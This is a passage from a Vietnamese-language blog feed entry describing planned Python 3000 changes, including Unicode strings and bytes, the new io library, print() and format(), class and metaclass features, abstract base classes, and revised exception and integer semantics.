&lt;div class="section" id="unicode-codec-va-i-o"&gt;
&lt;h3&gt;Unicode, Codec và I/O&lt;/h3&gt;
&lt;p&gt;Chúng ta đang chuyển qua mô hình được biết đến ở Java: các chuỗi (bất biến, immutable) là Unicode, và dữ liệu nhị phân được biểu diễn bởi một kiểu &lt;em&gt;byte&lt;/em&gt; dữ liệu khả biến (mutable) riêng. Hơn nữa, trình phân tích cú pháp sẽ sử dụng được cả Unicode: bảng mã mặc định của mã nguồn sẽ là UTF-8, các ký tự không nằm trong bảng ASCII có thể được dùng trong tên chỉ định (identifier). Vẫn còn nhiều vấn đề về chuẩn hóa, một vài ký tự cụ thể, và việc hỗ trợ các ngôn ngữ từ phải qua trái. Dù vậy, bộ thư viện chuẩn sẽ tiếp tục dùng ASCII cho các tên chỉ định và hạn thế các ký tự không ASCII trong ghi chú và các chuỗi trong kiểm tra đơn vị cho các tính năng Unicode và tên tác giả.&lt;/p&gt;
&lt;p&gt;Chúng ta dùng &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;&amp;quot;...&amp;quot;&lt;/span&gt;&lt;/tt&gt; hay &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;'...'&lt;/span&gt;&lt;/tt&gt; cho các chuỗi Unicode, và &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;b&amp;quot;...&amp;quot;&lt;/span&gt;&lt;/tt&gt; hay &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;b'...'&lt;/span&gt;&lt;/tt&gt; cho các byte. Ví dụ, &lt;tt class="docutils literal"&gt;b'abc'&lt;/tt&gt; có nghĩa là tạo một đối tượng byte y như kết quả của &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;bytes([97,&lt;/span&gt; 98, 99])&lt;/tt&gt;.&lt;/p&gt;
&lt;p&gt;Chúng ta sẽ theo một hướng khác với các codec: trong Python 2, các codec có thể nhận Unicode hoặc 8-bit như đầu nhập và xuất, trong Py3k, mã hóa (encoding) luôn luôn là từ một chuỗi Unicode thành một mảng byte, và giải mã (decoding) luôn luôn đi theo chiều ngược lại. Điều này có nghĩa là chúng ta sẽ bỏ một vài codec không tương thích với mô hình ví dụ như &lt;tt class="docutils literal"&gt;rot13&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;base64&lt;/tt&gt; và &lt;tt class="docutils literal"&gt;bz2&lt;/tt&gt; (những chuyển đổi này sẽ vẫn còn được hỗ trợ, chỉ có điều là không phải qua API mã hóa/giải mã).&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="thu-vien-i-o-moi"&gt;
&lt;h3&gt;Thư viện I/O mới&lt;/h3&gt;
&lt;p&gt;Sự phân biệt giữa byte và chuỗi dẫn đến một thay đổi nhỏ trong API. Trong thư viện mới, các dòng nhị phân (binary stream) (khi mở tập tin theo &lt;tt class="docutils literal"&gt;rb&lt;/tt&gt; hoặc &lt;tt class="docutils literal"&gt;wb&lt;/tt&gt;) và dòng văn bản (text stream) được phân biệt rõ ràng. Các dòng văn bản có một thuộc tính mới, encoding, có thể được thiết lập khi dòng được mở; nếu encoding không được cho biết trước, mặc định của hệ thống sẽ được dùng.&lt;/p&gt;
&lt;p&gt;Việc đọc từ dòng nhị phân sẽ trả về mảng byte, trong khi đọc từ dòng văn bản sẽ trả về chuỗi Unicode; và tương tự cho việc viết. Viết một chuỗi văn bản vào dòng nhị phân hoặc viết mảng byte vào dòng văn bản sẽ dẫn đến ngoại lệ (exception).&lt;/p&gt;
&lt;p&gt;Mặc dù vẫn còn hàm &lt;tt class="docutils literal"&gt;open()&lt;/tt&gt;, định nghĩa đầy đủ của thư viện I/O mới được đặt trong môđun &lt;tt class="docutils literal"&gt;io&lt;/tt&gt;. Môđun này cũng chứa các lớp khác cho các loại dòng khác nhau, một cài đặt mới của &lt;tt class="docutils literal"&gt;StringIO&lt;/tt&gt;, và một lớp mới &lt;tt class="docutils literal"&gt;BytesIO&lt;/tt&gt; giống như &lt;tt class="docutils literal"&gt;StringIO&lt;/tt&gt; nhưng dùng cho dòng nhị phân, để đọc và viết mảng byte.&amp;lt;/p&amp;gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="in-an-va-dinh-dang"&gt;
&lt;h3&gt;In ấn và định dạng&lt;/h3&gt;
&lt;p&gt;Hai chức năng I/O khác: lệnh &lt;tt class="docutils literal"&gt;print&lt;/tt&gt; trở thành hàm &lt;tt class="docutils literal"&gt;print()&lt;/tt&gt;, và phép định dạng chuỗi &lt;tt class="docutils literal"&gt;%&lt;/tt&gt; sẽ được thay bằng phương thức (method) &lt;tt class="docutils literal"&gt;format()&lt;/tt&gt; ở các đối tượng chuỗi.&lt;/p&gt;
&lt;p&gt;Chuyển &lt;tt class="docutils literal"&gt;print&lt;/tt&gt; thành một hàm sẽ làm nhiều người suy nghĩ. Tuy nhiên, có một vài điểm tốt ở đây: nó sẽ rất dễ hơn để chuyển từ việc dùng hàm &lt;tt class="docutils literal"&gt;print()&lt;/tt&gt; thành việc dùng gói &lt;tt class="docutils literal"&gt;logging&lt;/tt&gt;; và cú pháp &lt;tt class="docutils literal"&gt;print&lt;/tt&gt; luôn có một ít tranh cãi vì kiểu &lt;tt class="docutils literal"&gt;&amp;lt;&amp;lt; file&lt;/tt&gt; và ý nghĩa của dấu phẩy cuối cùng.&lt;/p&gt;
&lt;p&gt;Tương tự, phương thức &lt;tt class="docutils literal"&gt;format()&lt;/tt&gt; tránh được một vài điểm xấu của toán tử &lt;tt class="docutils literal"&gt;%&lt;/tt&gt; cũ, đặc biệt là kết quả bất ngờ của &lt;tt class="docutils literal"&gt;&amp;quot;%s&amp;quot; % x&lt;/tt&gt; khi x là tuple, và lỗi thường xảy ra khi vô tình bỏ quên &lt;tt class="docutils literal"&gt;s&lt;/tt&gt; trong &lt;tt class="docutils literal"&gt;%(name)s&lt;/tt&gt;. Các chuỗi định dạng mới sử dụng &lt;tt class="docutils literal"&gt;{0}&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;{1}&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;{2}&lt;/tt&gt;, ... cho các tham số theo vị trí, và &lt;tt class="docutils literal"&gt;{a}&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;{b}&lt;/tt&gt;, ... cho các tham số theo từ khóa. Tính năng khác bao gồm &lt;tt class="docutils literal"&gt;{a.b.c}&lt;/tt&gt; cho thuộc tính và ngay cả &lt;tt class="docutils literal"&gt;{a[b]}&lt;/tt&gt; cho dãy hoặc ánh xạ. Độ dài của trường có thể được chỉ định giống như &lt;tt class="docutils literal"&gt;{a:8}&lt;/tt&gt;; cách viết như vậy cũng hỗ trợ các tùy chọn khác.&lt;/p&gt;
&lt;p&gt;Phương thức &lt;tt class="docutils literal"&gt;format()&lt;/tt&gt; có thể được mở rộng theo nhiều chiều: bằng cách định nghĩa một phương thức &lt;tt class="docutils literal"&gt;__format__()&lt;/tt&gt; đặc biệt, các kiểu dữ liệu có thể quyết định cách định dạng, cách sử dụng các tham số; bạn cũng có thể tạo các lớp định dạng riêng nhằm để tự động cung cấp biến cục bộ như tham số cho cách định dạng.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="cac-thay-doi-ve-lop-va-he-thong-kieu"&gt;
&lt;h3&gt;Các thay đổi về lớp và hệ thống kiểu&lt;/h3&gt;
&lt;p&gt;Bạn có thể đoán được rằng các lớp cổ điển cuối cùng cũng ra đi. Lớp &lt;tt class="docutils literal"&gt;object&lt;/tt&gt; sẽ là lớp cơ sở mặc định cho các lớp mới. Điều này tạo chỗ cho những tính năng sau:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p class="first"&gt;Trang hoàng lớp (Class decorators). Chúng hoạt động như các trang hoàng hàm (function decorators):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nd"&gt;@art_deco&lt;/span&gt;
&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="o"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Ký hiệu hàm và phương thức từ nay có thể được “ghi chú” (annotated). Ngôn ngữ gốc sẽ không đặt ý nghĩa vào các ghi chú này (ngoài việc cung cấp chúng cho việc tự xét, introspection), nhưng một vài thư viện chuẩn sẽ làm vậy; ví dụ, hàm tổng quát (generic function) (xem ở dưới) có thể dùng chúng. Cú pháp cũng dễ đọc:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;foobar&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Sequence&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="o"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Cú pháp siêu lớp (metaclass) mới. Thay vì đặt một biến &lt;tt class="docutils literal"&gt;__metaclass__&lt;/tt&gt; trong thân lớp, bây giờ bạn phải chỉ định siêu lớp bằng cách dùng thông số từ khóa trong định nghĩa lớp, ví dụ như:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;C&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bases&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;metaclass&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;MyMeta&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="o"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Từ điển lớp (class dictionary) riêng. Nếu siêu lớp định nghĩa một phương thức &lt;tt class="docutils literal"&gt;__prepare__()&lt;/tt&gt;, nó sẽ được gọi trước khi vào thân lớp, và giá trị trả về sẽ được dùng thay cho từ điển chuẩn như là vùng tên (namespace) dùng trong thân lớp. Điểm này có thể được sử dụng để cài đặt kiểu &lt;em&gt;cấu trúc&lt;/em&gt; (struct) khi thứ tự các phần tử có vai trò quan trọng.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Bạn có thể chỉ định lớp cơ sở lúc chạy, như:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;bases&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;B1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;B2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;C&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;bases&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="o"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Các thông số từ khóa khác cũng được cho phép ở đầu đề lớp; chúng được truyền cho phương thức &lt;tt class="docutils literal"&gt;__new__&lt;/tt&gt; của siêu lớp.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Bạn có thể định nghĩa lại các kiểm tra &lt;tt class="docutils literal"&gt;isinstance()&lt;/tt&gt; và &lt;tt class="docutils literal"&gt;issubclass()&lt;/tt&gt;, bằng cách định nghĩa các phương thức &lt;tt class="docutils literal"&gt;__instancecheck__()&lt;/tt&gt; và &lt;tt class="docutils literal"&gt;__subclasscheck__()&lt;/tt&gt; của lớp. Khi chúng được định nghĩa, &lt;tt class="docutils literal"&gt;isinstance(x, C)&lt;/tt&gt; thành tương tự như &lt;tt class="docutils literal"&gt;C.__instancecheck__(x)&lt;/tt&gt;, và &lt;tt class="docutils literal"&gt;issubclass(D, C)&lt;/tt&gt; là &lt;tt class="docutils literal"&gt;C.__subclasscheck__(D)&lt;/tt&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Lớp cơ sở trừu tượng tự chọn (Voluntary Abstract Base Classes). Nếu bạn muốn định nghĩa một lớp hoạt động như một ánh xạ chẳng hạn, bạn có thể tự giác kế thừa (voluntarily inherit) từ lớp &lt;tt class="docutils literal"&gt;abc.Mapping&lt;/tt&gt;. Một mặt, lớp này cung cấp các cách thức có ích thay thế gần hết tính năng của các lớp &lt;tt class="docutils literal"&gt;UserDict&lt;/tt&gt; và &lt;tt class="docutils literal"&gt;DictMixin&lt;/tt&gt;. Mặt khác, sử dụng các ABC một cách có hệ thống có thể giúp các khung (framework) lớn thực hiện nhiều việc đúng đắn với ít “phỏng đoán” hơn: trong Python 2 khó mà nói rằng một đối tượng là một dãy, hay là một ánh xạ khi nó định nghĩa phương thức &lt;tt class="docutils literal"&gt;__getitem__()&lt;/tt&gt;. Các ABC sau được cung cấp cho người dùng: &lt;tt class="docutils literal"&gt;Hashable&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;Iterable&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;Iterator&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;Sized&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;Container&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;Callable&lt;/tt&gt;; &lt;tt class="docutils literal"&gt;Set&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;MutableSet&lt;/tt&gt;; &lt;tt class="docutils literal"&gt;Mapping&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;MutableMapping&lt;/tt&gt;; &lt;tt class="docutils literal"&gt;Sequence&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;MutableSequence&lt;/tt&gt;; &lt;tt class="docutils literal"&gt;Number&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;Complex&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;Real&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;Rational&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;Integer&lt;/tt&gt;. Môđun &lt;tt class="docutils literal"&gt;io&lt;/tt&gt; cũng định nghĩa một số ABC cho nên đây là lần đầu tiên Python có một đặc tả cho khái niệm &lt;em&gt;file-like&lt;/em&gt; (như kiểu tập tin) u ám. Sức mạnh của khung ABC nằm ở khả năng (ability) (mượn từ các giao tiếp Zope, Zope interface) &lt;em&gt;đăng ký&lt;/em&gt; một lớp cụ thể (concrete class) &lt;tt class="docutils literal"&gt;X&lt;/tt&gt; như &lt;em&gt;kế thừa ảo từ&lt;/em&gt; một ABC &lt;tt class="docutils literal"&gt;Y&lt;/tt&gt;, trong khi &lt;tt class="docutils literal"&gt;X&lt;/tt&gt; và &lt;tt class="docutils literal"&gt;Y&lt;/tt&gt; được viết bởi các tác giả khác nhau và có mặt trong các gói khác nhau. (Để làm rõ, khi dùng kế thừa ảo, cách thức của lớp &lt;tt class="docutils literal"&gt;Y&lt;/tt&gt; không được cung cấp cho lớp &lt;tt class="docutils literal"&gt;X&lt;/tt&gt;; hiệu quả duy nhất là &lt;tt class="docutils literal"&gt;issubclass(X, Y)&lt;/tt&gt; sẽ trả về &lt;tt class="docutils literal"&gt;True&lt;/tt&gt;.)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Để hỗ trợ việc định nghĩa ABC mà cần các lớp cụ thể thật sự cài đặt đầy đủ giao tiếp, trang hoàng &lt;tt class="docutils literal"&gt;&amp;#64;abc.abstractmethod&lt;/tt&gt; có thể được dùng để khai báo các phương thức trừu tượng (chỉ dùng trong các lớp mà siêu lớp là, hoặc, kế thừa từ &lt;tt class="docutils literal"&gt;abc.ABCMeta&lt;/tt&gt;).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Hàm tổng quát (generic functions). Việc thêm vào chức năng này, được trình bày trong PEP 3124, có vẻ chưa rõ lắm, vì PEP này có vẻ đã dậm chân tại chỗ. Hy vọng rằng nó sẽ được tiếp tục. Nó hỗ trợ sự chuyển hàm (function dispatch) dựa vào kiểu của các tham số, thay vì kiểu thông thường chỉ dựa vào lớp của đối tượng đích (target object).&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div class="section" id="cac-thay-doi-lon-khac"&gt;
&lt;h3&gt;Các thay đổi lớn khác&lt;/h3&gt;
&lt;p&gt;Chỉ một vài điểm sáng.&lt;/p&gt;
&lt;div class="section" id="sua-doi-ve-ngoai-le"&gt;
&lt;h4&gt;Sửa đổi về ngoại lệ&lt;/h4&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Các ngoại lệ chuỗi (string exception) không còn dùng.&lt;/li&gt;
&lt;li&gt;Mọi ngoại lệ phải bắt nguồn từ &lt;tt class="docutils literal"&gt;BaseException&lt;/tt&gt; và tốt hơn là từ &lt;tt class="docutils literal"&gt;Exception&lt;/tt&gt;.&lt;/li&gt;
&lt;li&gt;Chúng ta sẽ bỏ &lt;tt class="docutils literal"&gt;StandardException&lt;/tt&gt;.&lt;/li&gt;
&lt;li&gt;Ngoại lệ không còn hoạt động như dãy nữa. Thay vào đó chúng có một thuộc tính &lt;tt class="docutils literal"&gt;args&lt;/tt&gt; chứa tham số được truyền vào hàm khởi tạo (constructor).&lt;/li&gt;
&lt;li&gt;Cú pháp &lt;tt class="docutils literal"&gt;except E, e:&lt;/tt&gt; được đổi thành &lt;tt class="docutils literal"&gt;except E as e&lt;/tt&gt;. Điều này tránh những lẫn lộn hay gặp như &lt;tt class="docutils literal"&gt;except E1, E2:&lt;/tt&gt;.&lt;/li&gt;
&lt;li&gt;Tên biến đằng sau &lt;tt class="docutils literal"&gt;as&lt;/tt&gt; trong câu &lt;tt class="docutils literal"&gt;except&lt;/tt&gt; bị ép xóa thẳng ngay khi thoát khỏi câu &lt;tt class="docutils literal"&gt;except&lt;/tt&gt;.&lt;/li&gt;
&lt;li&gt;&lt;tt class="docutils literal"&gt;sys.exc_info()&lt;/tt&gt; trở nên dư thừa (hoặc có thể biến mất): thay vào đó, &lt;tt class="docutils literal"&gt;e.__class__&lt;/tt&gt; là kiểu ngoại lệ, và &lt;tt class="docutils literal"&gt;e.__traceback__&lt;/tt&gt; là vết ngược.&lt;/li&gt;
&lt;li&gt;Những thuộc tính tùy chọn như &lt;tt class="docutils literal"&gt;__context__&lt;/tt&gt; được thiết lập là ngoại lệ &lt;em&gt;trước&lt;/em&gt; khi một ngoại lệ xảy ra trong câu &lt;tt class="docutils literal"&gt;except&lt;/tt&gt; hay &lt;tt class="docutils literal"&gt;finally&lt;/tt&gt;; &lt;tt class="docutils literal"&gt;__cause__&lt;/tt&gt; có thể được thiết lập trực tiếp khi nâng ngoại lệ (raise exception) bằng cách dùng &lt;tt class="docutils literal"&gt;raise E1 from E2&lt;/tt&gt;.&lt;/li&gt;
&lt;li&gt;Các biến thể cũ của cú pháp &lt;tt class="docutils literal"&gt;raise&lt;/tt&gt; như &lt;tt class="docutils literal"&gt;raise E, e&lt;/tt&gt; và &lt;tt class="docutils literal"&gt;raise E, e, tb&lt;/tt&gt; biến mất.&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div class="section" id="sua-doi-ve-so-nguyen"&gt;
&lt;h4&gt;Sửa đổi về số nguyên&lt;/h4&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Sẽ chỉ có một kiểu số nguyên tên là &lt;tt class="docutils literal"&gt;int&lt;/tt&gt; với cách thức của &lt;tt class="docutils literal"&gt;long&lt;/tt&gt; trong Python 2. Hậu tố &lt;tt class="docutils literal"&gt;L&lt;/tt&gt; biến mất.&lt;/li&gt;
&lt;li&gt;&lt;tt class="docutils literal"&gt;1/2&lt;/tt&gt; sẽ trả về 0.5, không phải 0. (Dùng &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;1//2&lt;/span&gt;&lt;/tt&gt; nếu cần điều đó.)&lt;/li&gt;
&lt;li&gt;Cú pháp của số bát phân đổi thành &lt;tt class="docutils literal"&gt;0o777&lt;/tt&gt;, để tránh gây ra khó hiểu cho người mới.&lt;/li&gt;
&lt;li&gt;Số nhị phân: &lt;tt class="docutils literal"&gt;0b101 == 5&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;bin(5) == '0b101'&lt;/tt&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div class="section" id="bo-lap-iterator-hoac-kha-lap-iterable-thay-the-danh-sach-list"&gt;
&lt;h4&gt;Bộ lặp (Iterator) hoặc khả lặp (Iterable) thay thế danh sách (List)&lt;/h4&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;tt class="docutils literal"&gt;dict.keys()&lt;/tt&gt; và &lt;tt class="docutils literal"&gt;dict.items()&lt;/tt&gt; trả về tập hợp; &lt;tt class="docutils literal"&gt;dict.values()&lt;/tt&gt; trả về một cách nhìn khả lập (iterable view). Các phương thức &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;iter*()&lt;/span&gt;&lt;/tt&gt; khác biến mất.&lt;/li&gt;
&lt;li&gt;&lt;tt class="docutils literal"&gt;range()&lt;/tt&gt; trả về kiểu đối tượng mà &lt;tt class="docutils literal"&gt;xrange()&lt;/tt&gt; đã từng làm; &lt;tt class="docutils literal"&gt;xrange()&lt;/tt&gt; biến mất.&lt;/li&gt;
&lt;li&gt;&lt;tt class="docutils literal"&gt;zip()&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;map()&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;filter()&lt;/tt&gt; trả về các đối tượng khả lặp (như những hàm tương tự trong &lt;tt class="docutils literal"&gt;itertools&lt;/tt&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div class="section" id="cac-diem-khac"&gt;
&lt;h4&gt;Các điểm khác&lt;/h4&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;So sánh hơn kém (&lt;tt class="docutils literal"&gt;&amp;lt;&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;&amp;lt;=&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;&amp;gt;&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;&amp;gt;=&lt;/tt&gt;) sẽ nâng &lt;tt class="docutils literal"&gt;TypeError&lt;/tt&gt; thay vì trả về kết quả bất định. So sánh bằng (&lt;tt class="docutils literal"&gt;==&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;!=&lt;/tt&gt;) mặc định sẽ so sánh tính đồng nhất của hai đối tượng (&lt;tt class="docutils literal"&gt;is&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;is not&lt;/tt&gt;).&lt;/li&gt;
&lt;li&gt;Câu lệnh &lt;tt class="docutils literal"&gt;nonlocal&lt;/tt&gt; cho phép bạn gán vào các biến ở vòng ngoài (không phải toàn cục) (outer, non-global scope).&lt;/li&gt;
&lt;li&gt;Lệnh gọi &lt;tt class="docutils literal"&gt;super()&lt;/tt&gt; mới: Gọi &lt;tt class="docutils literal"&gt;super()&lt;/tt&gt; không tham số tương đương với &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;super(&amp;lt;this_class&amp;gt;,&lt;/span&gt; &amp;lt;first_arg&amp;gt;)&lt;/tt&gt;. &lt;tt class="docutils literal"&gt;super()&lt;/tt&gt; có thể dùng trong phương thức đối tượng hoặc phương thức của lớp.&lt;/li&gt;
&lt;li&gt;Tập hợp: &lt;tt class="docutils literal"&gt;{1, 2, 3}&lt;/tt&gt; và ngay cả bao hàm tập hợp (set comprehension): &lt;tt class="docutils literal"&gt;{x for x in y if P(x)}&lt;/tt&gt;. Chú ý rằng tập hợp rỗng là &lt;tt class="docutils literal"&gt;set()&lt;/tt&gt;, vì &lt;tt class="docutils literal"&gt;{}&lt;/tt&gt; là một từ điển rỗng!&lt;/li&gt;
&lt;li&gt;&lt;tt class="docutils literal"&gt;reduce()&lt;/tt&gt; biến mất (thật ra là chuyển vào &lt;tt class="docutils literal"&gt;functools&lt;/tt&gt;). Nó cho thấy rằng hầu hết các mã dùng &lt;tt class="docutils literal"&gt;reduce()&lt;/tt&gt; có thể trở nên dễ đọc hơn khi được viết lại bằng vòng lặp &lt;tt class="docutils literal"&gt;for&lt;/tt&gt;. (&lt;a class="reference external" href="http://aspn.activestate.com/ASPN/Cookbook/Python/Recipe/148061"&gt;Ví dụ&lt;/a&gt;.)&lt;/li&gt;
&lt;li&gt;lambda vẫn tồn tại.&lt;/li&gt;
&lt;li&gt;Cú pháp dấu phẩy ngược (backtick), thường khó đọc, biến mất (thay vào đó dùng &lt;tt class="docutils literal"&gt;repr()&lt;/tt&gt;), cũng như toán tử &lt;tt class="docutils literal"&gt;&amp;lt;&amp;gt;&lt;/tt&gt; (thay vào đó nên dùng &lt;tt class="docutils literal"&gt;!=&lt;/tt&gt;).&lt;/li&gt;
&lt;li&gt;Ở mức C, sẽ có một API bộ đệm mới, tốt hơn nhiều và sẽ cung cấp kết nối tốt hơn cho numpy (PEP 3118).&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="sua-doi-ve-thu-vien"&gt;
&lt;h3&gt;Sửa đổi về thư viện&lt;/h3&gt;
&lt;p&gt;Guido không muốn nói nhiều về các thay đổi ở thư viện chuẩn vì nó sẽ chỉ được thực hiện khi 3.0a1 ra đời. Vẫn rõ ràng thấy được là chúng ta sẽ bỏ nhiều thứ hết hạn hoặc không còn được hỗ trợ (ví dụ như nhiều môđun chỉ chạy với SGI IRIX), và chúng ta sẽ cố đổi tên các môđun sử dụng TênHoa như &lt;tt class="docutils literal"&gt;StringIO&lt;/tt&gt; hay &lt;tt class="docutils literal"&gt;UserDict&lt;/tt&gt;, để tương hợp với chuẩn đặt tên của PEP 8 (yêu cầu tên ngắn, toàn chữ thường cho môđun).&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="va-cuoi-cung"&gt;
&lt;h3&gt;Và cuối cùng&lt;/h3&gt;
&lt;p&gt;Guido muốn nhấn mạnh rằng lambda sẽ vẫn tồn tại.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
</content><category term="python 3000"></category></entry></feed>